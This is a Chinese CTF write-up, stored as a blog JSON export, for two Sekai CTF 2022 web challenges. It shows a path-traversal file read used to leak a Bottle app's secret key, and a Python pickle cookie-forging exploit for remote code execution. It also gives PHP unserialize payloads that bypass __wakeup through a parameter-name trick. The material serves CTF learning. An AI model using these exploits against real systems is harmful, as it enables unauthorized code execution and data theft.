{"title":"Sekai CTF 2022","uid":"ba0cf5d51c9ce53698d64b464314f97e","slug":"2022SekaiCTF","date":"2023-02-13T15:13:06.374Z","updated":"2023-08-06T08:02:12.273Z","comments":true,"path":"api/articles/2022SekaiCTF.json","keywords":null,"cover":"/img/42.jpg","content":"<p><code>国外比赛难度确实逆天</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Sekai-CTF-2022\"><a href=\"#Sekai-CTF-2022\" class=\"headerlink\" title=\"Sekai CTF 2022\"></a>Sekai CTF 2022</h1><p><a href=\"https://github.com/project-sekai-ctf/sekaictf-2022\">https://github.com/project-sekai-ctf/sekaictf-2022</a></p>\n<p>这是官方的<code>wp</code>和题目的<code>docker</code>，我后面还是把<code>web</code>都复现一下</p>\n<p><img src=\"/post/2022SekaiCT/image-20221003101420158.png\" alt=\"image-20221003101420158\"></p>\n<p><code>大比赛，每个题要么难出头，要么感觉就差一点，与大佬的差距，鼠鼠只能赛后复现wp了</code></p>\n<p><img src=\"/post/2022SekaiCT/image-20221003104433566.png\" alt=\"image-20221003104433566\"></p>\n<p><code>这是web难度【看起来就是按解题人数来分】</code></p>\n<h2 id=\"1-bottle-poem-后续学习了，补上自己的思路\"><a href=\"#1-bottle-poem-后续学习了，补上自己的思路\" class=\"headerlink\" title=\"1.bottle-poem[后续学习了，补上自己的思路]\"></a>1.bottle-poem[后续学习了，补上自己的思路]</h2><pre class=\" language-highlight py\"><code class=\"language-highlight py\">hint：\n\nCome <span class=\"keyword\">and</span> read poems <span class=\"keyword\">in</span> the bottle.\n\nNo bruteforcing <span class=\"keyword\">is</span> required to solve this challenge. Please do <span class=\"keyword\">not</span> use scanner tools. Rate limiting <span class=\"keyword\">is</span> applied. Flag <span class=\"keyword\">is</span> executable on server.\n\n翻译：\n\n快来读一读瓶中的诗吧。\n\n解决这一挑战不需要暴力破解。请不要使用扫描仪工具。应用速率限制。标志在服务器上是可执行的。</code></pre>\n\n<p>这道题我已经秃头了，开始觉得是单纯的文件包含，但是后面看到官方发的wp，感觉又没那么简单</p>\n<p>我先直接展示官方的wp，然后再展示我复现的过程</p>\n<pre class=\" language-highlight py\">Hey guys Thx <span class=\"keyword\">for</span> attending SekaiCTF  i made two challenges <span class=\"keyword\">for</span> this competition one <span class=\"keyword\">is</span> bottle poem another <span class=\"keyword\"><code class=\"language-highlight py\">Hey guys Thx <span class=\"keyword\">for</span> attending SekaiCTF  i made two challenges <span class=\"keyword\">for</span> this competition one <span class=\"keyword\">is</span> bottle poem another <span class=\"keyword\">is</span> sekaigame start\n\n<span class=\"keyword\">for</span> the bottle poem most of people think its guessy <span class=\"keyword\">and</span> at the start the challenge always down  so say sorry to u <span class=\"keyword\">and</span> respect to my buddy hfz that he fix this challenge \n\nhere <span class=\"keyword\">is</span> my short wp\n-----------------\nit<span class=\"string\">&#x27;s easy to find that this website has LFI</span>\n<span class=\"string\">u wanna to  read file directly but failed </span>\n<span class=\"string\">that&#x27;</span>s <span class=\"keyword\">not</span> show u that we hide it  that means u havent enough execute permission to read it (so we update description that flag <span class=\"keyword\">is</span> executable <span class=\"keyword\">and</span> u dont need some bruteforcing <span class=\"keyword\">or</span> guessing)flag <span class=\"keyword\">is</span> <span class=\"keyword\">in</span> the common path /flag\n\nso we need to read source\njust like this\n\nhttp://bottle-poem.ctf.sekai.team/show?<span class=\"built_in\">id</span>=/proc/self/cwd/app.py\n\nso dont need to bruteforce proc/self/ just use it to got sourcecode\n\nuse this way u can read the secret --sekai\n\nhttp://bottle-poem.ctf.sekai.team/show?<span class=\"built_in\">id</span>=/proc/self/cwd/config/secret.py\n\nnow u can control the cookies but <span class=\"keyword\">if</span> u read something just like /views/admin.html <span class=\"keyword\">or</span> just make guest to admin u would find its a troll \n\nso u need rce truely <span class=\"keyword\">if</span> u search some documentation will find the bottle<span class=\"string\">&#x27;s cookie_decode() will unpickle so use this to get rce</span>\n<span class=\"string\">https://github.com/bottlepy/bottle/issues/900</span>\n<span class=\"string\"></span>\n<span class=\"string\">here the steps</span>\n<span class=\"string\">1.lfi to read file and    secret</span>\n<span class=\"string\">2.use cookie pickle rce to reverse a shell</span>\n<span class=\"string\">3.execute /flag to get flag</span>\n<span class=\"string\">---------</span>\n<span class=\"string\">and my exp </span>\n<span class=\"string\">-------------</span>\n<span class=\"string\">demo exp</span>\n<span class=\"string\">import base64,hashlib,pickle,hmac</span>\n<span class=\"string\">import os</span>\n<span class=\"string\">def tob(s, enc=&#x27;</span>utf8<span class=\"string\">&#x27;):</span>\n<span class=\"string\">    if isinstance(s, str):</span>\n<span class=\"string\">        return s.encode(enc)</span>\n<span class=\"string\">    return b&#x27;</span><span class=\"string\">&#x27; if s is None else bytes(s)</span>\n<span class=\"string\"></span>\n<span class=\"string\"></span>\n<span class=\"string\">def cookie_encode(data, key):</span>\n<span class=\"string\">    &#x27;</span><span class=\"string\">&#x27;&#x27;</span> Encode <span class=\"keyword\">and</span> sign a pickle-able <span class=\"built_in\">object</span>. Return a (byte) string <span class=\"string\">&#x27;&#x27;&#x27;</span>\n<span class=\"string\">    msg = base64.b64encode(pickle.dumps(data, 0))</span>\n<span class=\"string\">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span>\n<span class=\"string\">    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msg</span>\n<span class=\"string\"></span>\n<span class=\"string\">class test():</span>\n<span class=\"string\">    def __reduce__(self):</span>\n<span class=\"string\">        return (eval,(&#x27;__import__(\"os\").popen(\"command\")&#x27;,))</span>\n<span class=\"string\"></span>\n<span class=\"string\"></span>\n<span class=\"string\">obj = test()</span>\n<span class=\"string\">a = cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)</span>\n<span class=\"string\">print(a)</span></code></pre>\n\n<p>翻译</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">大家好，感谢参加 SekaiCTF 我为这次比赛提出了两个挑战，一个是瓶子诗，另一个是 sekaigame start\n\n对于瓶子诗，大多数人认为它是猜测性的，一开始挑战总是失败，所以向你说声抱歉，并尊重我的好友 hfz，他解决了这个挑战\n\n这是我的简短 wp\n-----------------\n很容易发现这个网站有LFI（本地文件包含）\n你想直接读取文件但失败了\n这并没有告诉你我们隐藏它，这意味着你没有足够的执行权限来读取它（所以我们更新了标志是可执行的并且你不需要一些暴力破解或猜测的描述）标志在公共路径/标志中\n\n所以我们需要阅读源码\n像这样\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/app.py\n\n所以不需要蛮力 proc/self/ 只需使用它来获取源代码\n\n使用这种方式你可以阅读秘密--sekai\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py\n\n现在您可以控制 cookie，但如果您阅读 /views/admin.html 之类的内容，或者只是让访客成为管理员，您会发现它是一个巨魔（可以理解为恶搞）\n\n所以你真的需要 rce 如果你搜索一些文档会发现瓶子的 cookie_decode() 会解开所以用它来获取 rce\nhttps://github.com/bottlepy/bottle/issues/900\n\n这里的步骤\n1.lfi读取文件和秘密\n2.使用cookie pickle rce 反弹一个shell\n3.执行/flag获取flag</code></pre>\n\n<p>官方<code>exp</code></p>\n<pre class=\" language-highlight python\"><code class=\"language-highlight python\">demo exp\n<span class=\"keyword\">import</span> base64,hashlib,pickle,hmac\n<span class=\"keyword\">import</span> os\n<span class=\"keyword\">def</span> <span class=\"title function_\">tob</span>(<span class=\"params\">s, enc=<span class=\"string\">&#x27;utf8&#x27;</span></span>):\n    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(s, <span class=\"built_in\">str</span>):\n        <span class=\"keyword\">return</span> s.encode(enc)\n    <span class=\"keyword\">return</span> <span class=\"string\">b&#x27;&#x27;</span> <span class=\"keyword\">if</span> s <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">else</span> <span class=\"built_in\">bytes</span>(s)\n\n\n<span class=\"keyword\">def</span> <span class=\"title function_\">cookie_encode</span>(<span class=\"params\">data, key</span>):\n    <span class=\"string\">&#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;</span>\n    msg = base64.b64encode(pickle.dumps(data, <span class=\"number\">0</span>))\n    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())\n    <span class=\"keyword\">return</span> tob(<span class=\"string\">&#x27;!&#x27;</span>) + sig + tob(<span class=\"string\">&#x27;?&#x27;</span>) + msg\n\n<span class=\"keyword\">class</span> <span class=\"title class_\">test</span>():\n    <span class=\"keyword\">def</span> <span class=\"title function_\">__reduce__</span>(<span class=\"params\">self</span>):\n        <span class=\"keyword\">return</span> (<span class=\"built_in\">eval</span>,(<span class=\"string\">&#x27;__import__(\"os\").popen(\"command\")&#x27;</span>,))\n\n\nobj = test()\na = cookie_encode(obj,<span class=\"string\">&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;</span>)\n<span class=\"built_in\">print</span>(a)</code></pre>\n\n<hr>\n<p>下面是我复现理解操作</p>\n<p>先打开网站，看到有三个可以打开的链接</p>\n<p><img src=\"/post/2022SekaiCT/image-20221003201506807.png\" alt=\"image-20221003201506807\"></p>\n<p>先看看源码</p>\n<p><img src=\"/post/2022SekaiCT/image-20221003201547093.png\" alt=\"image-20221003201547093\"></p>\n<p>发现没什么额外的信息，三个链接是对应着三个文本文件</p>\n<p>看起来似乎是文件包含的题</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://bottle-poem.ctf.sekai.team/show?id=spring.txt</code></pre>\n\n<p><img src=\"/post/2022SekaiCT/image-20221003202543907.png\" alt=\"image-20221003202543907\"></p>\n<p>我们试试能不能显示其他信息，我在做的时候试的是<code>/etc/passwd</code></p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://bottle-poem.ctf.sekai.team/show?id=/etc/passwd</code></pre>\n\n<p><img src=\"/post/2022SekaiCT/image-20221003202814644.png\" alt=\"image-20221003202814644\"></p>\n<p>看来是方向对了，确实是可以包含本地文件并显示，但是没有其他信息能利用</p>\n<h3 id=\"查看当前进程的启动命令\"><a href=\"#查看当前进程的启动命令\" class=\"headerlink\" title=\"*查看当前进程的启动命令\"></a>*查看当前进程的启动命令</h3><p>这个是看最后发的<code>wp</code>，学到了</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">/proc/self/cmdline\n\n//该文件包含的是该进程的命令行参数，包括进程的启动路径(argv[0])</code></pre>\n\n<p>然后会下载一个名叫<code>show</code>的文件</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">python3 -u /app/app.py</code></pre>\n\n<p>在命令中，我们发现运行了一个<code>/app/app.py</code>的文件</p>\n<p>看来这就是我们网站启动的脚本，里面就有我们网站的源码</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://bottle-poem.ctf.sekai.team/show?id=/app/app.py</code></pre>\n\n<p>查看到文件源码</p>\n<pre class=\" language-highlight python\"><span class=\"keyword\">from</span> bottle <span class=\"keyword\"><code class=\"language-highlight python\"><span class=\"keyword\">from</span> bottle <span class=\"keyword\">import</span> route, run, template, request, response, error\n<span class=\"keyword\">from</span> config.secret <span class=\"keyword\">import</span> sekai\n<span class=\"keyword\">import</span> os\n<span class=\"keyword\">import</span> re\n\n\n<span class=\"meta\">@route(<span class=\"params\"><span class=\"string\">\"/\"</span></span>)</span>\n<span class=\"keyword\">def</span> <span class=\"title function_\">home</span>():\n    <span class=\"keyword\">return</span> template(<span class=\"string\">\"index\"</span>)\n\n\n<span class=\"meta\">@route(<span class=\"params\"><span class=\"string\">\"/show\"</span></span>)</span>\n<span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():\n    response.content_type = <span class=\"string\">\"text/plain; charset=UTF-8\"</span>\n    param = request.query.<span class=\"built_in\">id</span>\n    <span class=\"keyword\">if</span> re.search(<span class=\"string\">\"^../app\"</span>, param):\n        <span class=\"keyword\">return</span> <span class=\"string\">\"No!!!!\"</span>\n    requested_path = os.path.join(os.getcwd() + <span class=\"string\">\"/poems\"</span>, param)\n    <span class=\"keyword\">try</span>:\n        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(requested_path) <span class=\"keyword\">as</span> f:\n            tfile = f.read()\n    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:\n        <span class=\"keyword\">return</span> <span class=\"string\">\"No This Poems\"</span>\n    <span class=\"keyword\">return</span> tfile\n\n\n<span class=\"meta\">@error(<span class=\"params\"><span class=\"number\">404</span></span>)</span>\n<span class=\"keyword\">def</span> <span class=\"title function_\">error404</span>(<span class=\"params\">error</span>):\n    <span class=\"keyword\">return</span> template(<span class=\"string\">\"error\"</span>)\n\n\n<span class=\"meta\">@route(<span class=\"params\"><span class=\"string\">\"/sign\"</span></span>)</span>\n<span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():\n    <span class=\"keyword\">try</span>:\n        session = request.get_cookie(<span class=\"string\">\"name\"</span>, secret=sekai)\n        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> session <span class=\"keyword\">or</span> session[<span class=\"string\">\"name\"</span>] == <span class=\"string\">\"guest\"</span>:\n            session = &#123;<span class=\"string\">\"name\"</span>: <span class=\"string\">\"guest\"</span>&#125;\n            response.set_cookie(<span class=\"string\">\"name\"</span>, session, secret=sekai)\n            <span class=\"keyword\">return</span> template(<span class=\"string\">\"guest\"</span>, name=session[<span class=\"string\">\"name\"</span>])\n        <span class=\"keyword\">if</span> session[<span class=\"string\">\"name\"</span>] == <span class=\"string\">\"admin\"</span>:\n            <span class=\"keyword\">return</span> template(<span class=\"string\">\"admin\"</span>, name=session[<span class=\"string\">\"name\"</span>])\n    <span class=\"keyword\">except</span>:\n        <span class=\"keyword\">return</span> <span class=\"string\">\"pls no hax\"</span>\n\n\n<span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:\n    os.chdir(os.path.dirname(__file__))\n    run(host=<span class=\"string\">\"0.0.0.0\"</span>, port=<span class=\"number\">8080</span>)</code></pre>\n\n<p>在</p>\n<pre class=\" language-highlight python\"><span class=\"keyword\">from</span> config.secret <span class=\"keyword\"><code class=\"language-highlight python\"><span class=\"keyword\">from</span> config.secret <span class=\"keyword\">import</span> sekai</code></pre>\n\n<p>看到<code>config.secret</code>，这是个文件路径<code>/config/secret</code></p>\n<p>我们可以访问看看，能不能看到里面的内容【注意这个文件肯定是在 <code>/app</code>目录下】</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">http://bottle-poem.ctf.sekai.team/show?id=/app/config/secret.py</code></pre>\n\n<p>得到</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">sekai = \"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu\"</code></pre>\n\n\n\n<hr>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">1. lfi 读取文件和秘密\n2. 使用 cookie pickle rce 反弹shell\n3. 执行./flag获取flag</code></pre>\n\n<p>根据官方的<code>pickle rce</code>，这个涉及新的 <code>pickle</code> 反序列化技巧</p>\n<p>【流下没技术的眼泪】可我现在只会<code>php</code>反序列化，后面补上</p>\n<hr>\n<h2 id=\"2-sekai-game-start\"><a href=\"#2-sekai-game-start\" class=\"headerlink\" title=\"2.sekai-game-start\"></a>2.sekai-game-start</h2><pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"keyword\">include</span>(<span class=\"string\">&#x27;./flag.php&#x27;</span>);\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sekai_Game</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$start</span> = True;  \n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;\n        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>->start === True)&#123;\n            <span class=\"keyword\">echo</span> <span class=\"string\">\"Sekai Game Start Here is your flag \"</span>.<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;FLAG&#x27;</span>);\n        &#125;\n    &#125;\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;\n        <span class=\"variable language_\">$this</span>->start=False;    \n \n    &#125;\n&#125;\n<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sekai_game.run&#x27;</span>]))&#123;\n    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sekai_game.run&#x27;</span>]);\n&#125;<span class=\"keyword\">else</span>&#123;\n    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);\n&#125;\n\n<span class=\"meta\">?></span></code></pre>\n\n<p>看起来是到<code>反序列化</code>的题目，看起来似乎难度不大，但是我被瓶子诗卡了太久，这几天又在搞<code>DC5</code>，后面的题目发布出来都没怎么看了，早知道做一下了<code>【哭唧唧】</code></p>\n<p>我们先简单的分析一下源码内容</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"keyword\">include</span>(<span class=\"string\">&#x27;./flag.php&#x27;</span>);    <span class=\"comment\">//文件包含，把当前目录flag.php文件</span>\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sekai_Game</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$start</span> = True;<span class=\"comment\">//给strat变量赋值为True</span>\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;\n        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>->start === True)&#123;\n            <span class=\"keyword\">echo</span> <span class=\"string\">\"Sekai Game Start Here is your flag \"</span>.<span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&#x27;FLAG&#x27;</span>);\n            <span class=\"comment\">//getenv函数 用来获取php 环境变量</span>\n        &#125;\n    &#125;\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;\n        <span class=\"variable language_\">$this</span>->start=False;\n<span class=\"comment\">//这里又把start变量赋值为False，所以这里是需要绕过__wakeup魔术方法，不让其执行，只用把属性个数改得大于原来就行</span>\n    &#125;\n&#125;\n<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sekai_game.run&#x27;</span>]))&#123;\n    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sekai_game.run&#x27;</span>]);  <span class=\"comment\">//这里就是序列化的变量，变量名为sekai_game.run</span>\n&#125;<span class=\"keyword\">else</span>&#123;\n    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);\n&#125;\n\n<span class=\"meta\">?></span></code></pre>\n\n<p>然后我们整理一下</p>\n<p>得到我们的序列化的<code>php</code>代码</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sekai_Game</span></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$start</span> = True;  \n&#125;\n\n<span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sekai_Game</span>();\n<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);\n\n<span class=\"meta\">?></span></code></pre>\n\n<p>运行得到序列化结果</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">O:10:\"Sekai_Game\":1:&#123;s:5:\"start\";b:1;&#125;</code></pre>\n\n<p>我们修改一下属性值</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">O:10:\"Sekai_Game\":2:&#123;s:5:\"start\";b:1;&#125;</code></pre>\n\n<p><code>【苦笑】但实际是不行的</code></p>\n<h3 id=\"关键考点\"><a href=\"#关键考点\" class=\"headerlink\" title=\"关键考点\"></a>关键考点</h3><p>但是</p>\n<p><img src=\"/post/2022SekaiCT/image-20221003135130855.png\" alt=\"image-20221003135130855\"></p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">PhP 变量不能使用 . ，但是这个变量名很特殊：sekai_game.run. 它同时具有 _ 和 . \n\nphp默认将.所有参数名称转换为_，因为版本早于8，有一种方法可以解决这个问题，使用[ ，php忽略所有 . ，只转换[为_参数 ==> ?sekai[game.run=\n\n**学到了**</code></pre>\n\n<p>所以有效的<code>payload</code>为</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">url/?sekai[game.run=xxx</code></pre>\n\n\n\n<p>第二步是绕过<code>__wakeup</code></p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">这里我用\nO:10:\"Sekai_Game\":2:&#123;s:5:\"start\";b:1;&#125;\n\n实际还是绕不过__wakeup函数，就算是属性个数大于原来的属性个数\n\n==>网上找了以后，发现这个方法是有局限性的，对于高版本的php，这样是无法绕过__wakeup()\n----\n\n对于高版本的php\n可以用C:来绕过\n\n原理是C:代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了\n==>\nC:10:\"Sekai_Game\":2:&#123;s:5:\"start\";b:1;&#125;\n\n\n但是因为源码中已经赋值，所以不填写数据，\n只用实例化Sekai_Game类</code></pre>\n\n\n\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sekai_Game</span></span>&#123;\n&#125;\n\n<span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sekai_Game</span>();\n<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);\n\n<span class=\"meta\">?></span>\n\n\n==>O:<span class=\"number\">10</span>:<span class=\"string\">\"Sekai_Game\"</span>:<span class=\"number\">0</span>:&#123;&#125;\n==>C:<span class=\"number\">10</span>:<span class=\"string\">\"Sekai_Game\"</span>:<span class=\"number\">0</span>:&#123;&#125;</code></pre>\n\n\n\n<p>于是最后的payload为</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">?sekai[game.run=C:10:\"Sekai_Game\":0:&#123;&#125;</code></pre>\n\n\n\n<p><img src=\"/post/2022SekaiCT/image-20221003162948932.png\" alt=\"image-20221003162948932\"></p>\n<p><strong>得到flag</strong></p>\n","text":"国外比赛难度确实逆天 Sekai CTF 2022https://github.com/project-sekai-ctf/sekaictf-2022 这是官方...","permalink":"/post/2022SekaiCTF","photos":[],"count_time":{"symbolsCount":"8.7k","symbolsTime":"8 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Sekai-CTF-2022\"><span class=\"toc-text\">Sekai CTF 2022</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-bottle-poem-%E5%90%8E%E7%BB%AD%E5%AD%A6%E4%B9%A0%E4%BA%86%EF%BC%8C%E8%A1%A5%E4%B8%8A%E8%87%AA%E5%B7%B1%E7%9A%84%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">1.bottle-poem[后续学习了，补上自己的思路]</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%90%AF%E5%8A%A8%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">*查看当前进程的启动命令</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-sekai-game-start\"><span class=\"toc-text\">2.sekai-game-start</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B3%E9%94%AE%E8%80%83%E7%82%B9\"><span class=\"toc-text\">关键考点</span></a></li></ol></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"DASCTF X GFCTF 2022十月挑战赛","uid":"0a5f9ba95c642a008814712ab15f1814","slug":"2022DASCTF X GFCTF十月挑战赛-wp","date":"2023-02-13T15:19:34.978Z","updated":"2023-10-13T07:29:37.131Z","comments":true,"path":"api/articles/2022DASCTF X GFCTF十月挑战赛-wp.json","keywords":null,"cover":"/img/37.jpg","text":"有水平的 DASCTF X GFCTF 2022十月挑战赛1.EasyPOP一道构造pop链的题，拿来练习一下分析能力 做反序列构造pop链最重要还是要会联想，...","permalink":"/post/2022DASCTF X GFCTF十月挑战赛-wp","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"NewStarCTF2022公开赛-wp","uid":"8d801008e226a8eb98ad443ed169bddb","slug":"2022NewStarCTF","date":"2023-02-13T15:07:34.783Z","updated":"2023-08-06T08:01:55.254Z","comments":true,"path":"api/articles/2022NewStarCTF.json","keywords":null,"cover":"/img/40.jpg","text":"没啥简介 NewStarCTF2022公开赛虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点 1.NotPHP error_reportin...","permalink":"/post/2022NewStarCTF","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}